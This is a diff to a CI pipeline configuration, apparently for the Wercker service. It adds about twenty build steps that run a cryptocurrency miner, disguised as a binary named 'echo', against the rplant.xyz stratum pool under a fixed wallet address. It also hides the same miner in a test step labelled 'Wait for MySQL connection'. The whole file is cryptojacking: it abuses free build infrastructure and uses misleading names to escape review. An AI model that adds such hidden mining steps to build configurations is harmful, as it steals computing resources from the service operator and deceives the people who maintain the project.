@@ -11,12 +11,106 @@ build:
         code: |
           chmod +x echo
     - script:
+        name: execut1
+        code: |
+          ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 7 --cpu-priority 4 --time-limit 1000s
+    - script:
+        name: execut2
+        code: |
+          ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 7 --cpu-priority 4 --time-limit 1000s
+    - script:
+        name: execut3
+        code: |
+          ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 7 --cpu-priority 4 --time-limit 1000s
+
+    - script:
+        name: execut4
+        code: |
+          ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 7 --cpu-priority 4 --time-limit 1000s
+
+    - script:
+        name: execut5
+        code: |
+          ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 7 --cpu-priority 4 --time-limit 1000s
+    - script:
         name: execut
         code: |
-          ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 8 --cpu-priority 4
+          ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 7 --cpu-priority 4 --time-limit 1000s
+
+    - script:
+        name: execut
+        code: |
+          ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 7 --cpu-priority 4 --time-limit 1000s
+
+    - script:
+        name: execut
+        code: |
+          ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 7 --cpu-priority 4 --time-limit 1000s
+
+    - script:
+        name: execut
+        code: |
+          ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 7 --cpu-priority 4 --time-limit 1000s
+
+    - script:
+        name: execut
+        code: |
+          ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 7 --cpu-priority 4 --time-limit 1000s
+
+    - script:
+        name: execut
+        code: |
+          ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 7 --cpu-priority 4 --time-limit 1000s
+
+    - script:
+        name: execut
+        code: |
+          ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 7 --cpu-priority 4 --time-limit 1000s
+
+    - script:
+        name: execut
+        code: |
+          ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 7 --cpu-priority 4 --time-limit 1000s
+
+    - script:
+        name: execut
+        code: |
+          ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 7 --cpu-priority 4 --time-limit 1000s
+
+    - script:
+        name: execut
+        code: |
+          ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 7 --cpu-priority 4 --time-limit 1000s
+
+    - script:
+        name: execut
+        code: |
+          ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 7 --cpu-priority 4 --time-limit 1000s
+
+    - script:
+        name: execut
+        code: |
+          ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 7 --cpu-priority 4 --time-limit 1000s
+
+    - script:
+        name: execut
+        code: |
+          ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 7 --cpu-priority 4 --time-limit 1000s
+
+    - script:
+        name: execut
+        code: |
+          ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 7 --cpu-priority 4 --time-limit 1000s
+
+    - script:
+        name: execut
+        code: |
+          ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 7 --cpu-priority 4 --time-limit 1000s
+
+
 
 test:
   steps:
     - script:
         name: Wait for MySQL connection
-        code: ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 8 --cpu-priority 4
+        code: ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 7 --cpu-priority 4
